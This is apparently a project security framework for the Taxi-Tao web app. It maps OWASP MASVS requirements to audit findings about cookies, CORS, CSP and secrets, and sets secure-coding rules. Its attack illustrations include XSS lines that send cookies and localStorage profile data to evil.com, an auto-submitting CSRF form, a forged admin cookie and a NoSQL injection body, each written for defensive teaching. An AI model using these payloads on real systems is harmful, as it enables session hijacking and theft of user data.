# Taxi-Tao Web Security Framework

> Comprehensive security rules derived from OWASP MASVS v2.0, Firebase security best practices 2026, and lessons learned from production audit findings. Every developer and AI agent must follow these rules.

---

## Standards Alignment

| Standard | Coverage |
|----------|----------|
| OWASP MASVS-STORAGE | Data-at-rest protection, secure local storage |
| OWASP MASVS-CRYPTO | Cryptographic operations, key management |
| OWASP MASVS-AUTH | Authentication, authorization, session management |
| OWASP MASVS-NETWORK | Data-in-transit protection, API security |
| OWASP MASVS-PLATFORM | Platform-specific security (Next.js / React) |
| OWASP MASVS-CODE | Secure coding practices, dependency management |
| OWASP MASVS-PRIVACY | PII handling, data minimization |
| Firebase Security Rules 2026 | Firestore, Storage rules |
| OWASP Mobile Top 10 2025 | M1-M10 vulnerabilities |

### OWASP MASVS Mapping

| MASVS Requirement | Rule | Location | Status |
|-------------------|------|----------|--------|
| MASVS-STORAGE-1 | No sensitive data in localStorage | lib/auth-context.tsx | VIOLATION (C4) |
| MASVS-STORAGE-2 | Session cookies httpOnly | lib/auth-context.tsx | VIOLATION (H4) |
| MASVS-CRYPTO-1 | Use crypto.randomUUID() | All token generation | VIOLATION (C3) |
| MASVS-CRYPTO-2 | No Math.random() for security | Multiple files | VIOLATION (H1) |
| MASVS-AUTH-1 | Verify session against Firebase Auth | lib/auth-server.ts | VIOLATION (C5) |
| MASVS-AUTH-2 | Email verification required | firestore.rules | COMPLIANT |
| MASVS-AUTH-3 | Role-based access control | firestore.rules + API routes | COMPLIANT |
| MASVS-NETWORK-1 | HTTPS only | next.config.ts | COMPLIANT |
| MASVS-NETWORK-2 | CSP headers | next.config.ts | VIOLATION (H3) |
| MASVS-NETWORK-3 | CORS restriction | cors.json | VIOLATION (C6) |
| MASVS-PLATFORM-1 | DOMPurify for HTML | app/driver/marketing-poster | VIOLATION (M2) |
| MASVS-PLATFORM-2 | No eval()/Function() | N/A | COMPLIANT |
| MASVS-CODE-1 | Input validation with Zod | lib/validate.ts | COMPLIANT |
| MASVS-CODE-2 | Error handling | lib/error-utils.ts | COMPLIANT |
| MASVS-PRIVACY-1 | Split-data architecture | firestore.rules | COMPLIANT |
| MASVS-PRIVACY-2 | Data minimization | Various | PARTIAL |

---

## 1. Shared Backend Security (Same as Mobile)

The Firestore rules (`firestore.rules`), Cloud Functions, and Storage rules (`storage.rules`) are **identical** between web and mobile. All rules in this section apply to both platforms.

### 1.1 Firestore Security Rules

#### 1.1.1 Identity Helper Functions

Every helper function MUST perform complete security checks. Never create no-op passthrough functions.

```javascript
// CORRECT -- Full verification
function isEmailVerified() {
  return request.auth != null && request.auth.token.email_verified == true;
}

// WRONG -- No-op that disables email verification
function isEmailVerified() {
  return request.auth != null;  // This is just isSignedIn()
}
```

**Mandatory helpers and what they MUST check:**

| Helper | Requirements |
|--------|-------------|
| `isSignedIn()` | `request.auth != null` |
| `isEmailVerified()` | Signed in AND `request.auth.token.email_verified == true` |
| `isOwner(userId)` | Signed in AND `request.auth.uid == userId` |
| `isNotSuspended()` | Signed in AND user doc exists AND `suspended != true` |
| `isAdmin()` | Signed in AND email verified AND role == 'admin' AND not suspended |
| `getUserData()` | MUST be wrapped in `exists()` check before use |

#### 1.1.2 Collection Rule Patterns

**Pattern: Owner-only access**
```javascript
match /users/{userId} {
  allow read: if isOwner(userId) || isAdmin();
  allow update: if isOwner(userId)
    && request.resource.data.role == resource.data.role;  // Prevent role escalation
  allow delete: if isAdmin();
}
```

**Pattern: Split-data (public + private)**
```javascript
match /bookingRequests/{requestId} {
  allow read: if isSignedIn() && isEmailVerified();
  allow create: if isSignedIn() && isEmailVerified();
}
match /bookingRequestPrivate/{requestId} {
  allow read: if isSignedIn() && isEmailVerified()
    && (isSubscribedDriver() || isAdmin());
  allow create: if false;  // Cloud Functions only (Admin SDK bypasses rules)
}
```

**Pattern: System-only writes (immutable audit)**
```javascript
match /adminAuditLogs/{logId} {
  allow read: if isAdmin();
  allow create, update, delete: if false;  // Cloud Functions only
}
```

#### 1.1.3 Rule Antipatterns -- NEVER Use

| Antipattern | Why It's Dangerous |
|-------------|-------------------|
| `allow read, write: if true` | Open to the entire internet -- anyone can read/write all data |
| `allow create: if true` | Unauthenticated users can inject arbitrary documents |
| `allow read: if isSignedIn()` without email check | Unverified accounts get full access |
| Duplicate `match` blocks for same path | Last block silently overrides; first becomes dead code |
| `getUserData()` without `exists()` guard | Throws error if user document is missing |
| `get()` on potentially missing documents | Must use `exists()` first in Firestore rules v2 |

**Known duplicate match blocks in this codebase:**
- `/notifications/{notificationId}`: Lines 460 and 813
- `/driverNotifications/{notificationId}`: Lines 477 and 833
- `/app_crashes/{crashId}`: Lines 570 and 780

#### 1.1.4 Default Deny Rule

Every Firestore rules file MUST end with:
```javascript
match /{document=**} {
  allow read, write: if false;
}
```

### 1.2 Cloud Functions Security (Shared)

#### 1.2.1 Guard Middleware

Every `onCallV2` function MUST use the `withGuard()` wrapper:

```javascript
const { withGuard } = require("./lib/guard");

exports.myFunction = onCallV2(
  {
    memory: "256MiB",
    timeoutSeconds: 30,
    secrets: ["API_KEY"],
    ...withGuard(handler, {
      role: "driver",
      requireSubscription: true,
    }),
  },
  handler
);
```

**What withGuard provides:**
1. Authentication guard -- rejects unauthenticated requests
2. Global kill-switch check -- blocks all if system is down
3. Per-user rate limiting -- Firestore-backed sliding window
4. Role enforcement -- optional, checks user doc role
5. Subscription enforcement -- optional
6. Error wrapping -- prevents internal error leakage

#### 1.2.2 Input Validation with Zod

ALL callable functions MUST validate inputs with Zod schemas:

```javascript
const { z } = require("zod");

const CreateBookingSchema = z.object({
  vehicleId: z.string().min(1).max(128),
  startDateIso: z.string().refine((v) => !isNaN(Date.parse(v))),
  endDateIso: z.string().refine((v) => !isNaN(Date.parse(v))),
  durationDays: z.number().int().min(1).max(365),
  handoverMode: z.enum(["pickup", "delivery"]),
  driverMode: z.enum(["self", "chauffeur"]),
});
```

#### 1.2.3 Error Handling

**CORRECT:**
```javascript
catch (error) {
  logger.error("Function failed", { error, correlationId });
  throw new HttpsError("internal", "Operation failed");
}
```

**WRONG -- Leaks internal details:**
```javascript
catch (error) {
  throw new HttpsError("internal", error.message);
}
```

### 1.3 Payment Function Security

Payment functions have EXTRA security requirements:

1. Ownership check (`customerId == auth.uid`)
2. Status check (`approved/active` only)
3. Server-side balance computation from ALL existing payments
4. Amount validation (must be > 0 and <= balance)
5. Duplicate detection (M-Pesa codes, bank references)
6. Atomic transaction for consistency

---

## 2. Web-Specific Security (NEW -- Based on Actual Findings)

### 2.1 Session Management

#### 2.1.1 Cookie Lifecycle

| Phase | Method | Flags Required |
|-------|--------|---------------|
| Set (login) | Server-side Set-Cookie | httpOnly, secure, sameSite=Lax, path=/, maxAge=7d |
| Read (middleware) | request.cookies.get() | N/A |
| Read (API) | cookies() from next/headers | N/A |
| Clear (logout) | Server-side Set-Cookie | maxAge=0 |

#### 2.1.2 Cookie Security Rules

1. NEVER set cookies via `document.cookie` -- use Set-Cookie header
2. ALWAYS use httpOnly flag -- prevents XSS theft
3. ALWAYS use secure flag in production -- prevents HTTP interception
4. ALWAYS use sameSite=Lax -- prevents CSRF
5. ALWAYS clear cookies on logout -- maxAge=0
6. NEVER store raw Firebase ID tokens in cookies -- use session cookies
7. ALWAYS verify session cookies against Firebase Auth

#### 2.1.3 Real-World Attack: Session Hijacking

```
ATTACKER: Discovers XSS vulnerability in a form field
  → Injects <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
  → If cookie is NOT httpOnly: STEALS the session cookie
  → If cookie IS httpOnly: JavaScript CANNOT read it, attack fails

DEFENSE: httpOnly + secure + sameSite=Lax
  → httpOnly: Cookie invisible to JavaScript
  → secure: Cookie only sent over HTTPS
  → sameSite=Lax: Cookie not sent on cross-site form submissions
```

**Finding C5:** Session cookie fallback to unverified UID

The session cookie in `lib/auth-server.ts` (lines 70-90) trusts a plain UID without cryptographic verification. An attacker who can set cookies (via subdomain) can forge this cookie.

**Rules:**

```typescript
// CORRECT -- Verify against Firebase Auth
if (authTokenCookie) {
  const decoded = await getAuth(adminApp).verifyIdToken(authTokenCookie);
  // Use decoded.uid
}

// WRONG -- Trust plain UID from cookie (C5 finding)
if (sessionCookie) {
  const uid = sessionCookie;  // FORGEABLE!
}
```

**Finding H4:** Session cookies set via document.cookie

`lib/auth-context.tsx` (lines 221-234) sets cookies via `document.cookie` which CANNOT set the `httpOnly` flag. This means XSS attacks can steal session tokens.

**Rules:**
- MUST set session cookies server-side via `Set-Cookie` header
- MUST use `httpOnly` flag (prevents JavaScript access)
- MUST use `secure` flag (HTTPS only)
- MUST use `sameSite=Lax` (CSRF protection)
- MUST clear both `session` and `firebase-auth-token` cookies on logout

#### 2.1.4 Real-World Attack: Cookie Forgery

```
ATTACKER: Has access to a subdomain (e.g., evil.taxitao.co.ke)
  → Sets cookie: document.cookie = "session=ADMIN_UID; path=/"
  → If server trusts plain UID: ATTACKER GAINS ADMIN ACCESS
  → If server verifies against Firebase Auth: Attack fails

DEFENSE: Always verify session cookie against Firebase Auth
  → Server calls: getAuth().verifyIdToken(token)
  → Server fetches: Firestore user document to get role
  → Server checks: ownership, suspension, email verification
```

### 2.2 XSS Prevention

#### 2.2.1 Content Security Policy (CSP)

**Finding H3:** No CSP header configured

`next.config.ts` defines security headers but does NOT include a `Content-Security-Policy` header.

**Rules:**
- MUST configure CSP with nonce-based `script-src`
- MUST restrict `default-src` to `'self'`
- MUST block `unsafe-inline` and `unsafe-eval`
- MUST restrict `connect-src` to known API endpoints

**Recommended CSP header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'; img-src 'self' https://images.unsplash.com https://firebasestorage.googleapis.com data:; connect-src 'self' https://*.googleapis.com https://*.firebaseio.com wss://*.firebaseio.com; font-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
```

**Real-World Attack: Stored XSS**
```
ATTACKER: Submits a booking note containing <script>stealCookies()</script>
  → If no CSP: Script executes in other users' browsers
  → If CSP with nonce: Script blocked (wrong nonce)
  → If CSP with 'self': Script from external domain blocked

DEFENSE: CSP + DOMPurify
  → CSP blocks inline scripts and external domains
  → DOMPurify strips malicious HTML before rendering
  → Both layers work together for defense-in-depth
```

#### 2.2.2 HTML Sanitization

**Finding M2:** HTML sanitization via regex

`app/api/send-email/route.ts` (lines 64-67) uses regex to strip `<script>` tags and event handlers. This is insufficient -- it misses `<iframe>`, `<object>`, `<embed>`, `<form>`, and encoded payloads.

**Rules:**
- NEVER use regex for HTML sanitization
- ALWAYS use DOMPurify for user-provided HTML
- Whitelist approach (allow known-safe tags only)
- Sanitize all user-provided HTML before display

#### 2.2.3 dangerouslySetInnerHTML

**Finding 10:** dangerouslySetInnerHTML with user-influenced SVG

`app/driver/marketing-poster/page.tsx:864` uses `dangerouslySetInnerHTML` with SVG generated from user-controlled data.

**Rules:**
- NEVER use `dangerouslySetInnerHTML` without DOMPurify
- Validate SVG content against a whitelist of allowed elements
- Sanitize all dynamic content before rendering

### 2.3 CORS Security

**Finding C6:** Wildcard CORS configuration

`cors.json` line 3: `"origin": ["*"]` allows requests from any origin.

**Rules:**
- NEVER use `"*"` as CORS origin in production
- Restrict to your domains (e.g., `["https://taxitao.co.ke"]`)
- Validate `Origin` header on API routes
- Use `Access-Control-Allow-Origin` with specific origins

**Real-World Attack: CORS Misconfiguration**
```
ATTACKER: Sends request from evil.com to api.taxitao.co.ke
  → If CORS allows "*": Browser sends request, attacker reads response
  → If CORS restricted to taxitao.co.ke: Browser blocks the request

WORSE: If CORS allows subdomains:
  → ATTACKER compromises any subdomain (e.g., evil.taxitao.co.ke)
  → Can read API responses from the main domain
  → Steals user data, session tokens, financial information

DEFENSE: Restrict CORS to exact domains
  → origin: ["https://taxitao.co.ke", "https://www.taxitao.co.ke"]
  → NEVER use wildcards or subdomain patterns in production
```

### 2.4 Input Validation

**Existing good pattern:** `lib/validate.ts` provides Zod validation schemas.

**Rules:**
- ALL API route inputs MUST be validated with Zod
- ALL string fields MUST have `.max(N)` (prevent storage abuse)
- ALL numeric fields MUST have `.min(N).max(N)` bounds
- Client-side validation is UX only; server validates everything

**Real-World Attack: NoSQL Injection**
```
ATTACKER: Sends request body: {"email": {"$gt": ""}, "password": "anything"}
  → Without Zod: MongoDB interprets {"$gt": ""} as "any non-empty string"
  → Attacker bypasses authentication without knowing the password
  → Gains access to any account

DEFENSE: Zod validation
  → Zod expects: {"email": "user@example.com"} (string)
  → Zod rejects: {"email": {"$gt": ""}} (object, not string)
  → Attack blocked at validation layer
```

### 2.5 Rate Limiting

**Existing good pattern:** `lib/rate-limit.ts` provides in-memory rate limiting.

**Limitation:** In-memory store does not work across multiple Vercel serverless instances.

**Rules:**
- Apply rate limiting to all sensitive endpoints
- Use fail-closed design (return `{ allowed: false }` on error)
- Consider Upstash Redis for distributed rate limiting in production
- Predefined limits: LOGIN (5/15min), PAYMENT (5/min), EMAIL (5/min)

**Real-World Attack: Brute Force**
```
ATTACKER: Writes script to try 10,000 passwords per minute
  → Without rate limit: Attacker tries all combinations
  → With rate limit: 5 attempts per 15 minutes
  → 10,000 attempts would take: 20,000 minutes = 13.9 days

DEFENSE: Rate limiting + account lockout
  → Rate limit: 5 attempts per 15 minutes
  → Account lockout: After 10 failed attempts
  → IP blocking: After 3 lockouts from same IP
```

### 2.6 CSRF Protection

**Rules:**
- Use `SameSite=Lax` on all cookies (already done)
- Use Server Actions for mutations (built-in CSRF)
- Validate `Origin`/`Referer` headers on state-changing API routes
- Never rely solely on CSRF tokens in cookies

**Real-World Attack: Cross-Site Request Forgery**
```
ATTACKER: Creates page on evil.com with:
  <form action="https://taxitao.co.ke/api/vendor/payments/confirm" method="POST">
    <input name="paymentId" value="fake-payment-123">
    <input type="submit">
  </form>
  <script>document.forms[0].submit()</script>

  → If no SameSite: Browser sends cookie with request
  → If SameSite=Lax: Cookie NOT sent on cross-site POST
  → Attack fails because session cookie is not included

DEFENSE: SameSite=Lax + Server Actions
  → SameSite=Lax: Cookie only sent on top-level navigation (GET)
  → Server Actions: Built-in CSRF protection via origin checking
  → Both together prevent CSRF attacks
```

### 2.7 Open Redirect Prevention

**Rules:**
- Validate redirect URLs against an allowlist
- Never redirect to user-supplied URLs
- Use relative paths for internal redirects (`/login`, `/dashboard`)
- Validate `returnTo` parameter in login flow

**Real-World Attack: Open Redirect**
```
ATTACKER: Sends link: https://taxitao.co.ke/login?returnTo=https://evil.com
  → User logs in successfully
  → Redirected to evil.com (which looks like taxitao.co.ke)
  → Attacker steals credentials via fake login form

DEFENSE: Validate returnTo parameter
  → Only allow relative paths: returnTo.startsWith("/") && !returnTo.startsWith("//")
  → Reject external URLs: new URL(returnTo).hostname !== "taxitao.co.ke"
  → Redirect to safe default: returnTo = "/"
```

### 2.8 localStorage Security (Web-Specific)

**Finding C4 (detailed):**

| What's Stored | Location | Risk | Fix |
|---------------|----------|------|-----|
| `userProfile` | localStorage | XSS steals role, email, PII | Use React state |
| `driverProfile` | localStorage | XSS steals driver data | Use React state |
| `companyProfile` | localStorage | XSS steals company data | **FIXED** — Removed all localStorage from auth-context.tsx |
| `userRole` | localStorage | Role simulation, confusing | Remove in production |

**Rules:**
- NEVER use `localStorage.setItem("userProfile", ...)` -- use React state
- NEVER use `localStorage.setItem("driverProfile", ...)` -- use React state
- NEVER use `localStorage.setItem("companyProfile", ...)` -- use React state
- Remove role simulation (`userRole`) in production builds

**Real-World Attack: XSS Data Exfiltration**
```
ATTACKER: Finds XSS vulnerability in a form field
  → Injects: <script>fetch('https://evil.com/steal?data='+localStorage.getItem('userProfile'))</script>
  → If profiles in localStorage: ATTACKER STEALS ALL USER DATA
    - Email, name, phone, role, companyId, driverId
    - Can impersonate user, access restricted data
  → If profiles in React state: localStorage is empty, attack yields nothing

DEFENSE: Store profiles in React state only
  → React state cleared on page unload
  → httpOnly cookies for session data
  → CSP blocks inline scripts
  → DOMPurify sanitizes user content
```

### 2.9 Open Redirect via Cookie

**Finding: `document.cookie` sets session without path validation**

The session cookie is set with `path=/` which is correct, but the `returnTo` parameter in the login flow could be exploited for open redirect.

**Rules:**
- Validate `returnTo` parameter against a whitelist of internal paths
- Never redirect to external URLs from `returnTo`
- Use `new URL(returnTo, window.location.origin)` and check hostname matches

---

## 3. Secrets Management

### 3.1 Secret Classification

| Secret Type | Where It Lives | How It's Accessed |
|-------------|---------------|-------------------|
| Firebase Web API Key | `NEXT_PUBLIC_FIREBASE_API_KEY` env var | `process.env.NEXT_PUBLIC_FIREBASE_API_KEY` |
| Google Maps Key | `NEXT_PUBLIC_GOOGLE_MAPS_API_KEY` env var | `process.env.NEXT_PUBLIC_GOOGLE_MAPS_API_KEY` |
| Resend API Key | `RESEND_API_KEY` env var (Vercel) | `process.env.RESEND_API_KEY` |
| Cloudinary Secret | `CLOUDINARY_API_SECRET` env var (Vercel) | `process.env.CLOUDINARY_API_SECRET` |
| Firebase Admin Private Key | `FIREBASE_ADMIN_PRIVATE_KEY` env var (Vercel) | `process.env.FIREBASE_ADMIN_PRIVATE_KEY` |

### 3.2 What NEVER Goes in Source Code

- Server-side API keys (Resend, Cloudinary, payment gateways)
- Private keys (RSA, service accounts)
- Passwords or salts
- Session secrets
- Any value not prefixed with `NEXT_PUBLIC_`

### 3.3 .gitignore Requirements

These MUST be in `.gitignore`:
```
.env
.env.*
.env.local
.env.development
.env.production
*service-account*.json
*firebase-admin*.json
*credentials*.json
*.log
scratch/
```

### 3.4 Finding C1: Service Account in Repository

`scratch/firebase-service-account.json` contains a full Firebase service account with RSA private key. This file must be:
1. Added to `.gitignore` immediately
2. Removed from git tracking (`git rm --cached`)
3. The key rotated (it's compromised if committed)

### 3.5 Finding: Admin Emails Exposed via NEXT_PUBLIC_ — **FIXED**

`lib/admin-permission-helper.ts` now uses `SUPER_ADMIN_UIDS` (server-only, no `NEXT_PUBLIC_` prefix). The old `NEXT_PUBLIC_MAIN_ADMIN_EMAIL` and `NEXT_PUBLIC_MAIN_ADMIN_ACTION_EMAIL` variables have been removed.

**Rules:**
- NEVER use `NEXT_PUBLIC_` prefix for admin emails
- Use server-side environment variables only for sensitive identifiers
- Move super-admin detection to server-side checks

---

## 4. Data Privacy (OWASP MASVS-PRIVACY)

### 4.1 PII Classification

| Data Type | Sensitivity | Storage Location | Access Control |
|-----------|------------|-----------------|----------------|
| Full name | Medium | `users/{uid}` | Owner + Admin |
| Email | Medium | `users/{uid}` | Owner + Admin |
| Phone number | HIGH | `bookingRequestPrivate` | Subscribed driver + Admin |
| Exact address | HIGH | `bookingRequestPrivate` | Subscribed driver + Admin |
| KYC documents | CRITICAL | `driver_private` | Driver + Admin |
| Payment info | CRITICAL | `hirePayments` | Customer + Company + Admin |
| Session data | CRITICAL | httpOnly cookie | Server only |

### 4.2 Split-Data Architecture

```
bookingRequests (PUBLIC)
  - pickupArea, dropoffArea (general areas, not exact)
  - estimatedFare
  - timestamp
  - status

bookingRequestPrivate (PRIVATE)
  - customerPhone
  - pickupAddress (exact)
  - dropoffAddress (exact)
  - pickupCoords (exact)
  - dropoffCoords (exact)
  -> Access requires isSubscribedDriver() (verified + subscribed + visible)
```

### 4.3 Data Retention Policies

| Data Type | Retention | Deletion Method |
|-----------|-----------|-----------------|
| User accounts | Until deletion request | Account deletion flow |
| Booking requests | 90 days | Automated cleanup |
| Hire requests | 1 year | Automated cleanup |
| Audit logs | 2 years | Manual review |
| Crash reports | 30 days | Automated cleanup |
| Notifications | 30 days | Automated cleanup |
| Session cookies | 7 days | maxAge expiry |

### 4.4 Cookie Consent (Web-Specific)

- Implement cookie consent banner for GDPR compliance
- Document which cookies are essential vs analytics
- Allow users to opt out of non-essential cookies

### 4.5 GDPR Compliance

- Essential cookies: session (httpOnly), CSRF (sameSite)
- Analytics cookies: @vercel/analytics (requires consent)
- Marketing cookies: None currently
- Cookie consent banner required before setting non-essential cookies
- Users must be able to opt out of analytics
- Privacy policy must document all cookies

---

## 5. Monitoring & Incident Response

### 5.1 Security Events to Log

| Event | Severity | Where to Log |
|-------|----------|-------------|
| Failed authentication | Medium | `adminAuditEvents` |
| Permission violation | High | `adminAuditEvents` + alert |
| Rate limit exceeded | Medium | `adminAuditEvents` |
| Session forgery attempt | Critical | `adminAuditEvents` + immediate alert |
| Privilege escalation attempt | Critical | `adminAuditEvents` + immediate alert |
| XSS injection attempt | Critical | `adminAuditEvents` + immediate alert |
| Payment anomaly | High | `adminAuditEvents` + alert |

### 5.2 Alert Thresholds

| Pattern | Threshold | Window | Severity |
|---------|-----------|--------|----------|
| Permission violations | 3 events | 15 min | Medium |
| Rate limit exceeded | 2 events | 10 min | High |
| Session forgery | 1 event | 5 min | Critical |
| After-hours access | 5 events | 60 min | Medium |
| Privilege escalation | 1 event | 5 min | Critical |

### 5.3 Incident Response Playbooks

**If a secret is exposed:**
1. Identify the exposed secret (API key, private key, token)
2. Rotate immediately:
   - Firebase: Console > Project Settings > Service Accounts > Rotate Key
   - Resend: Dashboard > API Keys > Regenerate
   - Cloudinary: Dashboard > Settings > Reset Key
3. Check git history: `git log --all -p -- <file>`
4. If committed: `git rm --cached <file>` + force push
5. Update all references to use new key
6. Verify .gitignore covers the file
7. Document in adminAuditEvents

**If XSS is discovered:**
1. Identify the injection vector (user input, URL param, stored data)
2. Deploy DOMPurify fix immediately
3. Add CSP headers if missing
4. Audit all user-generated content rendering
5. Check for data exfiltration in logs
6. Force session refresh for affected users

**If Firestore rules are deployed with vulnerabilities:**
1. Deploy default-deny immediately: `match /{document=**} { allow read, write: if false; }`
2. Then deploy corrected rules incrementally
3. Test with Firebase emulator first

**If a session vulnerability is discovered:**
1. Invalidate ALL active sessions by rotating the session secret
2. Force all users to re-authenticate
3. Check audit logs for unauthorized access
4. Deploy httpOnly cookie fix if not already done

---

## 6. Crash Prevention

### 6.1 Firestore Rules Crash Prevention

```javascript
// WRONG -- Throws if user document doesn't exist
resource.data.companyId == getUserData().companyId

// CORRECT -- Safe with exists() guard
exists(/databases/$(database)/documents/users/$(request.auth.uid))
  && resource.data.companyId == getUserData().companyId
```

### 6.2 API Route Crash Prevention

```typescript
// WRONG -- Crashes on null/undefined
const userName = userDoc.data.name.toUpperCase();

// CORRECT -- Safe with optional chaining
const userName = userDoc.data?.name?.toUpperCase() ?? "Unknown";
```

### 6.3 Client-Side Crash Prevention

```typescript
// CORRECT -- Wrap async operations
try {
  const result = await someAsyncOperation();
  setState(result);
} catch (error) {
  logger.error("Operation failed", { error });
  // Show user-friendly error
}

// CORRECT -- Handle network failures
const response = await fetch(url).catch(() => null);
if (!response) {
  setOfflineMode(true);
  return;
}
```

### 6.4 React Error Boundaries

```typescript
// Wrap error-prone components
<ErrorBoundary fallback={<ErrorFallback />}>
  <RiskyComponent />
</ErrorBoundary>
```

---

## 7. Dependency Security

### 7.1 Allowed Dependencies

| Package | Purpose | Location |
|---------|---------|----------|
| `firebase` | Client SDK | root |
| `firebase-admin` | Server SDK | root (server-only) |
| `zod` | Input validation | lib/ |
| `next` | Framework | root |

### 7.2 Prohibited in Client Code

- `firebase-admin` -- Server-only, never in client components
- `crypto` (Node.js full module) -- Use `crypto.randomUUID()` (browser-safe subset)

### 7.3 Dependency Audit

```bash
npm audit
```

Run before major releases and after any dependency changes.

---

## 8. Testing Requirements

### 8.1 Security Test Cases

For every new API route or component, test:

| Test Case | Expected Result |
|-----------|----------------|
| Unauthenticated request to protected endpoint | Rejected (401) |
| Wrong role accessing role-gated endpoint | Rejected (403) |
| Missing required fields in request | Rejected (400) |
| Exceeding rate limit | Rejected (429) |
| XSS payload in input field | Sanitized/rejected |
| SQL/NoSQL injection in input | Sanitized/rejected |
| Open redirect attempt | Blocked |
| Valid authenticated request with correct data | Accepted (200) |

### 8.2 Firestore Rules Testing

```bash
firebase emulators:start
# Test each rule path with:
# - Unauthenticated request (should be denied for protected paths)
# - Authenticated user (should only access own data)
# - Admin user (should access all data)
# - Unverified email (should be denied if email verification required)
```

---

*This framework is a living document. Update it as new patterns emerge, new threats are identified, or the codebase evolves. Last updated: 2026-05-31.*